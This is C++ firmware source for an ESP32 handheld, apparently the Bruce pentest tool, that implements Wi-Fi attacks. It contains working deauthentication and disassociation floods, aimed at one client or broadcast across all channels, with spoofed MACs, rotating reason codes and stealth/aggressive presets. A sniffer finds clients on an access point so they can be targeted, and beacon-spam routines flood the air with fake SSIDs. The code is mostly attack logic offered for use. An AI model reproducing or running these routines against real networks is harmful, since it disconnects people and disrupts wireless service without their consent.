void target_atk(String tssid, String mac, uint8_t channel) {
    resetGlobalState();
    // Stop WebUI before setting WiFi mode for attack
    cleanlyStopWebUiForWiFiFeature();
    if (!wifi_atk_setWifi()) return;

    uint8_t target_mac[6];
    sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &target_mac[0], &target_mac[1], &target_mac[2],
           &target_mac[3], &target_mac[4], &target_mac[5]);

    uint8_t gateway_mac[6];
    memcpy(gateway_mac, ap_record.bssid, 6);

    int packets_per_mac, delay_ms;
    bool spoofing;
    deauth_preset_config(&packets_per_mac, &delay_ms, &spoofing);

    bool enhanced = initMonitorMode(channel);
    if (!enhanced) {
        wifiDisconnect();
        WiFi.mode(WIFI_AP);
        String ssid = "DEAUTH_" + String(random(1000, 9999));
        if (!WiFi.softAP(ssid.c_str(), emptyString, channel, 1, 4, false)) {
            displayError("Failed to start AP mode", true);
            wifi_atk_unsetWifi();
            return;
        }
    }

    uint8_t deauth_ap_to_sta[26], disassoc_ap_to_sta[26];
    uint8_t deauth_sta_to_ap[26], disassoc_sta_to_ap[26];
    
    buildDeauthFrame(deauth_ap_to_sta, target_mac, gateway_mac, gateway_mac, 0x07, false);
    buildDeauthFrame(disassoc_ap_to_sta, target_mac, gateway_mac, gateway_mac, 0x07, true);
    buildDeauthFrame(deauth_sta_to_ap, gateway_mac, target_mac, gateway_mac, 0x07, false);
    buildDeauthFrame(disassoc_sta_to_ap, gateway_mac, target_mac, gateway_mac, 0x07, true);

    drawMainBorderWithTitle("Target Deauth");
    tft.setTextSize(FP);
    padprintln("AP: " + tssid);
    padprintln("Channel: " + String(channel));
    padprintln(mac);
    padprintln("");
    padprintln("Press Any key to STOP.");
    padprintln("SEL: Options");

    long tmp = millis();
    int cont = 0;
    int total_frames = 0;
    int packet_count = 0;
    uint8_t spoof_mac[6];
    uint8_t reason_codes[] = {0x01, 0x04, 0x06, 0x07, 0x08};
    uint8_t current_reason = 0;
    bool show_options = false;
    bool attack_running = true;

    while (attack_running && !check(AnyKeyPress)) {
        if (check(SelPress)) {
            show_options = true;
            break;
        }

        if (cont % 20 == 0) {
            current_reason = (current_reason + 1) % 5;
            deauth_ap_to_sta[24] = reason_codes[current_reason];
            disassoc_ap_to_sta[24] = reason_codes[current_reason];
            deauth_sta_to_ap[24] = reason_codes[current_reason];
            disassoc_sta_to_ap[24] = reason_codes[current_reason];
        }
        
        if (packet_count % packets_per_mac == 0) {
            if (spoofing) {
                generateRandomMAC(spoof_mac);
            } else {
                memcpy(spoof_mac, gateway_mac, 6);
            }
            memcpy(&deauth_ap_to_sta[10], spoof_mac, 6);
            memcpy(&deauth_sta_to_ap[4], spoof_mac, 6);
        }

        if (enhanced) {
            esp_wifi_80211_tx(WIFI_IF_STA, deauth_ap_to_sta, 26, false);
            esp_wifi_80211_tx(WIFI_IF_STA, disassoc_ap_to_sta, 26, false);
            esp_wifi_80211_tx(WIFI_IF_STA, deauth_sta_to_ap, 26, false);
            esp_wifi_80211_tx(WIFI_IF_STA, disassoc_sta_to_ap, 26, false);
        } else {
            send_raw_frame(deauth_ap_to_sta, 26);
            send_raw_frame(disassoc_ap_to_sta, 26);
            send_raw_frame(deauth_sta_to_ap, 26);
            send_raw_frame(disassoc_sta_to_ap, 26);
        }

        cont += 4;
        total_frames += 4;
        packet_count += 4;

        if (cont % 16 == 0) {
            delay(35);
        } else {
            if (delay_ms > 0) delay(delay_ms);
        }

        if (millis() - tmp > 1000) {
            int fps = cont;
            cont = 0;
            tmp = millis();

            tft.fillRect(tftWidth - 100, tftHeight - 40, 100, 40, TFT_BLACK);
            tft.drawRightString(String(fps) + " fps", tftWidth - 12, tftHeight - 36, 1);
            tft.drawRightString("Total: " + String(total_frames), tftWidth - 12, tftHeight - 20, 1);
        }
    }

    if (show_options) {
        options = {
            {"Normal Mode", [&]() { current_preset = PRESET_NORMAL; }},
            {"Stealth Mode", [&]() { current_preset = PRESET_STEALTH; }},
            {"Aggressive Mode", [&]() { current_preset = PRESET_AGGRESSIVE; }},
            {"Resume Attack", [&]() { show_options = false; }},
            {"Exit Attack", [&]() { attack_running = false; returnToMenu = true; }}
        };
        loopOptions(options);
        if (!returnToMenu) {
            show_options = false;
        }
    }

    if (enhanced) esp_wifi_set_promiscuous(false);
    wifi_atk_unsetWifi();
    returnToMenu = true;
}

/***************************************************************************************
** function: enhancedBroadcastDeauth
** @brief: Broadcast deauth on all channels with MAC rotation
***************************************************************************************/
void enhancedBroadcastDeauth() {
    if (!wifi_atk_setWifi()) return;
    
    int packets_per_mac, delay_ms;
    bool spoofing;
    deauth_preset_config(&packets_per_mac, &delay_ms, &spoofing);
    
    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t src_mac[6];
    uint8_t deauth_buf[26];
    int total_frames = 0, fps = 0, packet_count = 0;
    unsigned long fps_timer = millis();
    
    drawMainBorderWithTitle("Broadcast Deauth");
    padprintln("Press any key to stop");
    
    for (int ch = 1; ch <= 14 && !check(AnyKeyPress); ch++) {
        if (!initMonitorMode(ch)) continue;
        for (int i = 0; i < 100 && !check(AnyKeyPress); i++) {
            if (packet_count % packets_per_mac == 0) {
                generateRandomMAC(src_mac);
                buildDeauthFrame(deauth_buf, broadcast_mac, src_mac, broadcast_mac, 0x07, false);
            }
            esp_wifi_80211_tx(WIFI_IF_STA, deauth_buf, 26, false);
            total_frames++;
            fps++;
            packet_count++;
            if (delay_ms > 0) delay(delay_ms);
        }
        if (millis() - fps_timer > 1000) {
            tft.fillRect(tftWidth - 100, tftHeight - 40, 100, 40, TFT_BLACK);
            tft.drawRightString(String(fps) + " fps", tftWidth - 12, tftHeight - 36, 1);
            tft.drawRightString("Total: " + String(total_frames), tftWidth - 12, tftHeight - 20, 1);
            fps = 0;
            fps_timer = millis();
        }
    }
    
    esp_wifi_set_promiscuous(false);
    wifi_atk_unsetWifi();
    returnToMenu = true;
}

/***************************************************************************************
** function: enhancedDeviceDeauth
** @brief: Passive sniffing + fingerprinting + targeted deauth
***************************************************************************************/
void enhancedDeviceDeauth() {
    if (!wifi_atk_setWifi()) return;
    
    drawMainBorderWithTitle("Device Deauth");
    padprintln("Scanning for APs...");
    
    int num_aps = WiFi.scanNetworks(false, false);
    if (num_aps == 0) {
        displayError("No APs found", true);
        wifi_atk_unsetWifi();
        return;
    }
    
    std::vector<String> ap_list;
    std::vector<uint8_t*> ap_bssids;
    std::vector<int> ap_channels;
    
    for (int i = 0; i < num_aps && i < 20; i++) {
        ap_list.push_back(String(i+1) + ". " + WiFi.SSID(i) + " (" + WiFi.BSSIDstr(i) + ") Ch" + WiFi.channel(i));
        ap_bssids.push_back((uint8_t*)WiFi.BSSID(i));
        ap_channels.push_back(WiFi.channel(i));
    }
    WiFi.scanDelete();
    
    int selected = 0;
    int last_selected = -1;
    while (true) {
        if (selected != last_selected) {
            tft.fillRect(20, 60, tftWidth - 40, tftHeight - 120, bruceConfig.bgColor);
            for (int i = 0; i < 5 && selected + i < (int)ap_list.size(); i++) {
                int y = 60 + i * 25;
                if (i == 0) {
                    tft.fillRect(20, y, tftWidth - 40, 20, TFT_WHITE);
                    tft.setTextColor(TFT_BLACK, TFT_WHITE);
                    tft.setCursor(25, y + 5);
                    tft.print("> ");
                } else {
                    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
                    tft.setCursor(25, y + 5);
                    tft.print("  ");
                }
                tft.print(ap_list[selected + i]);
            }
            last_selected = selected;
        }
        if (check(NextPress)) { selected++; if (selected >= (int)ap_list.size()) selected = 0; delay(150); }
        if (check(PrevPress)) { selected--; if (selected < 0) selected = ap_list.size() - 1; delay(150); }
        if (check(SelPress)) break;
        if (check(EscPress)) { wifi_atk_unsetWifi(); return; }
        delay(50);
    }
    
    uint8_t* target_bssid = ap_bssids[selected];
    int channel = ap_channels[selected];
    
    drawMainBorderWithTitle("Device Deauth");
    padprintln("Sniffing for clients on CH" + String(channel));
    padprintln("10 seconds...");
    
    // Setup sniffer
    sniffed_clients.clear();
    memcpy(sniff_target_bssid, target_bssid, 6);
    sniffing_active = true;
    
    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(device_deauth_sniffer);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    unsigned long start = millis();
    int last_count = 0;
    
    while (millis() - start < 10000) {
        if (check(EscPress)) break;
        
        int current_count = sniffed_clients.size() / 6;
        if (current_count != last_count) {
            tft.fillRect(20, 120, 150, 20, TFT_BLACK);
            tft.setCursor(20, 120);
            tft.print("Found: " + String(current_count) + " clients");
            last_count = current_count;
        }
        delay(100);
    }
    
    sniffing_active = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    
    if (sniffed_clients.empty()) {
        displayError("No clients found", true);
        wifi_atk_unsetWifi();
        return;
    }
    
    // Display found clients
    drawMainBorderWithTitle("Device Deauth");
    padprintln("Found " + String(sniffed_clients.size() / 6) + " devices");
    
    // Build client list for selection
    std::vector<String> client_list;
    for (size_t i = 0; i < sniffed_clients.size(); i += 6) {
        char mac[18];
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 sniffed_clients[i], sniffed_clients[i+1], sniffed_clients[i+2],
                 sniffed_clients[i+3], sniffed_clients[i+4], sniffed_clients[i+5]);
        client_list.push_back(String(mac));
    }
    
    int client_selected = 0;
    int client_last = -1;
    while (true) {
        if (client_selected != client_last) {
            tft.fillRect(20, 100, tftWidth - 40, tftHeight - 150, bruceConfig.bgColor);
            for (int i = 0; i < 5 && client_selected + i < (int)client_list.size(); i++) {
                int y = 100 + i * 25;
                if (i == 0) {
                    tft.fillRect(20, y, tftWidth - 40, 20, TFT_WHITE);
                    tft.setTextColor(TFT_BLACK, TFT_WHITE);
                    tft.setCursor(25, y + 5);
                    tft.print("> ");
                } else {
                    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
                    tft.setCursor(25, y + 5);
                    tft.print("  ");
                }
                tft.print(client_list[client_selected + i]);
            }
            client_last = client_selected;
        }
        if (check(NextPress)) { client_selected++; if (client_selected >= (int)client_list.size()) client_selected = 0; delay(150); }
        if (check(PrevPress)) { client_selected--; if (client_selected < 0) client_selected = client_list.size() - 1; delay(150); }
        if (check(SelPress)) break;
        if (check(EscPress)) { wifi_atk_unsetWifi(); return; }
        delay(50);
    }
    
    // Get selected client MAC
    uint8_t target_client[6];
    for (int i = 0; i < 6; i++) {
        target_client[i] = sniffed_clients[client_selected * 6 + i];
    }
    
    int packets_per_mac, deauth_delay_ms;
    bool spoofing;
    deauth_preset_config(&packets_per_mac, &deauth_delay_ms, &spoofing);
    
    initMonitorMode(channel);
    uint8_t deauth_buf[26];
    uint8_t spoof_mac[6];
    int total_frames = 0, fps = 0, packet_count = 0;
    unsigned long fps_timer = millis();
    
    drawMainBorderWithTitle("Device Deauth");
    char mac_str[18];
    snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             target_client[0], target_client[1], target_client[2],
             target_client[3], target_client[4], target_client[5]);
    padprintln("Attacking: " + String(mac_str));
    padprintln("Channel: " + String(channel));
    padprintln("Press any key to stop");
    
    while (!check(AnyKeyPress)) {
        if (packet_count % packets_per_mac == 0) {
            generateRandomMAC(spoof_mac);
            buildDeauthFrame(deauth_buf, target_client, spoof_mac, target_bssid, 0x07, false);
        }
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_buf, 26, false);
        total_frames++;
        fps++;
        packet_count++;
        if (deauth_delay_ms > 0) delay(deauth_delay_ms);
        
        if (millis() - fps_timer > 1000) {
            tft.fillRect(tftWidth - 100, tftHeight - 40, 100, 40, TFT_BLACK);
            tft.drawRightString(String(fps) + " fps", tftWidth - 12, tftHeight - 36, 1);
            tft.drawRightString("Total: " + String(total_frames), tftWidth - 12, tftHeight - 20, 1);
            fps = 0;
            fps_timer = millis();
        }
    }
    
    esp_wifi_set_promiscuous(false);
    wifi_atk_unsetWifi();
    returnToMenu = true;
}

void generateRandomWiFiMac(uint8_t *mac) {
    for (int i = 1; i < 6; i++) { mac[i] = random(0, 255); }
}

char randomName[32];
char *randomSSID() {
    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = rand() % 22 + 7;
    for (int i = 0; i < len; ++i) { randomName[i] = charset[rand() % strlen(charset)]; }
    randomName[len] = '\0';
    return randomName;
}

char emptySSID[32];
const char Beacons[] PROGMEM = {"Mom Use This One\n"
                                "Abraham Linksys\n"
                                "Benjamin FrankLAN\n"
                                "Martin Router King\n"
                                "John Wilkes Bluetooth\n"
                                "Pretty Fly for a Wi-Fi\n"
#ifndef LITE_VERSION
                                "Bill Wi the Science Fi\n"
                                "I Believe Wi Can Fi\n"
                                "Tell My Wi-Fi Love Her\n"
                                "No More Mister Wi-Fi\n"
                                "LAN Solo\n"
                                "The LAN Before Time\n"
                                "Silence of the LANs\n"
                                "House LANister\n"
                                "Winternet Is Coming\n"
                                "Ping's Landing\n"
                                "The Ping in the North\n"
                                "This LAN Is My LAN\n"
                                "Get Off My LAN\n"
                                "The Promised LAN\n"
                                "The LAN Down Under\n"
                                "FBI Surveillance Van 4\n"
                                "Area 51 Test Site\n"
                                "Drive-By Wi-Fi\n"
                                "Planet Express\n"
                                "Wu Tang LAN\n"
                                "Darude LANstorm\n"
                                "Never Gonna Give You Up\n"
                                "Hide Yo Kids, Hide Yo Wi-Fi\n"
                                "Loading…\n"
                                "Searching…\n"
                                "VIRUS.EXE\n"
                                "Virus-Infected Wi-Fi\n"
                                "Starbucks Wi-Fi\n"
#endif
                                "Text 64ALL for Password\n"
                                "Yell BRUCE for Password\n"
                                "The Password Is 1234\n"
                                "Free Public Wi-Fi\n"
                                "No Free Wi-Fi Here\n"
                                "Get Your Own Damn Wi-Fi\n"
                                "It Hurts When IP\n"
                                "Dora the Internet Explorer\n"
                                "404 Wi-Fi Unavailable\n"
                                "Porque-Fi\n"
                                "Titanic Syncing\n"
                                "Test Wi-Fi Please Ignore\n"
                                "Drop It Like It's Hotspot\n"
                                "Life in the Fast LAN\n"
                                "The Creep Next Door\n"
                                "Ye Olde Internet\n"};

const char rickrollssids[] PROGMEM = {"01 Never gonna give you up\n"
                                      "02 Never gonna let you down\n"
                                      "03 Never gonna run around\n"
                                      "04 and desert you\n"
                                      "05 Never gonna make you cry\n"
                                      "06 Never gonna say goodbye\n"
                                      "07 Never gonna tell a lie\n"
                                      "08 and hurt you\n"};

void beaconSpamList(const char list[]) {
    uint8_t beaconPacket[BEACON_PKT_LEN];
    uint8_t macAddr[6];
    int i = 0;
    int ssidsLen = strlen_P(list);

    // go to the next channel
    nextChannel();

    while (i < ssidsLen) {
        // Read next SSID from PROGMEM up to newline
        char ssidBuf[32];
        int j = 0;
        char tmp;
        // read chars from PROGMEM until newline
        do {
            tmp = pgm_read_byte(list + i + j);
            if (j < 32 && tmp != '\n') ssidBuf[j] = tmp;
            j++;
        } while (tmp != '\n' && i + j < ssidsLen);

        uint8_t ssidLen = (j > 32) ? 32 : j - 1;

        // generate MAC and prepare packet
        generateRandomWiFiMac(macAddr);
        prepareBeaconPacket(beaconPacket, macAddr, ssidBuf, ssidLen, wifi_channel, true);

        // send 2 packets instead of 3 (makes devices show more networks)
        for (int k = 0; k < 2; k++) {
            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, BEACON_PKT_LEN, 0);
            vTaskDelay(1 / portTICK_PERIOD_MS);
        }

        // move cursor past the SSID and newline
        i += j;
        if (EscPress) break;
    }
}

void beaconSpamSingle(String baseSSID) {
    uint8_t beaconPacket[BEACON_PKT_LEN];
    uint8_t macAddr[6];
    int counter = 1;

    // initial channel rotation
    nextChannel();

    while (true) {
        // Create SSID with suffix (within 32 limit)
        String currentSSID = baseSSID + String(counter);
        if (currentSSID.length() > 32) { currentSSID = currentSSID.substring(0, 32); }
        uint8_t ssidLen = currentSSID.length();

        // prepare packet
        generateRandomWiFiMac(macAddr);
        prepareBeaconPacket(beaconPacket, macAddr, currentSSID.c_str(), ssidLen, wifi_channel, true);

        // send 2 packets
        for (int k = 0; k < 2; k++) {
            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, BEACON_PKT_LEN, 0);
            vTaskDelay(1 / portTICK_PERIOD_MS);
        }

        counter++;
        if (counter > 9999) {
            counter = 1;
            nextChannel(); // change channel after resetting the counter
        }
        if (EscPress) break;
    }
}

void beaconAttack() {
    resetGlobalState();
    if (!wifi_atk_setWifi()) return;

    int BeaconMode;
    String txt = "";
    String singleSSID = "";
    // create empty SSID
    for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
    // for random generator
    randomSeed(1);
    options = {
        {"Funny SSID",
         [&]() {
             BeaconMode = 0;
             txt = "Spamming Funny";
         }                        },
        {"Ricky Roll",
         [&]() {
             BeaconMode = 1;
             txt = "Spamming Ricky";
         }                        },
        {"Random SSID",
         [&]() {
             BeaconMode = 2;
             txt = "Spamming Random";
         }                        },
#if !defined(LITE_VERSION)
        {"Single SSID",
         [&]() {
             BeaconMode = 4;
             txt = "Spamming Single";
         }                        },
        {"Custom SSIDs", [&]() {
             BeaconMode = 3;
             txt = "Spamming Custom";
         }},
#endif
    };
    addOptionToMainMenu();
    loopOptions(options);

    wifiConnected = true;
    String beaconFile = "";
    File file;
    FS *fs;
#if !defined(LITE_VERSION)
    // Get user input for single SSID mode
    if (BeaconMode == 4) {
        singleSSID = keyboard("BruceBeacon", 26, "Base SSID:");
        if (singleSSID.length() == 0) { return; }
    }
#endif
    if (BeaconMode != 3) {
        drawMainBorderWithTitle("WiFi: Beacon SPAM");
        displayTextLine(txt);
    }

    while (1) {
        if (BeaconMode == 0) {
            beaconSpamList(Beacons);
        } else if (BeaconMode == 1) {
            beaconSpamList(rickrollssids);
        } else if (BeaconMode == 2) {
            char *randoms = randomSSID();
            beaconSpamList(randoms);
        }
#if !defined(LITE_VERSION)
        else if (BeaconMode == 4) {
            beaconSpamSingle(singleSSID);
        } else if (BeaconMode == 3) {
            if (!file) {
                options = {};

                fs = nullptr;
                if (setupSdCard()) {
                    options.push_back({"SD Card", [&]() { fs = &SD; }});
                }
                options.push_back({"LittleFS", [&]() { fs = &LittleFS; }});
                addOptionToMainMenu();

                loopOptions(options);
                if (fs != nullptr) beaconFile = loopSD(*fs, true, "TXT");
                else return;
                file = fs->open(beaconFile, FILE_READ);
                beaconFile = file.readString();
                beaconFile.replace("\r\n", "\n");
                tft.drawPixel(0, 0, 0);
                drawMainBorderWithTitle("WiFi: Beacon SPAM");
                displayTextLine(txt);
            }

            const char *randoms = beaconFile.c_str();
            beaconSpamList(randoms);
        }
#endif
        if (check(EscPress) || returnToMenu) {
            if (BeaconMode == 3) file.close();
            break;
        }
    }
    wifi_atk_unsetWifi();
}
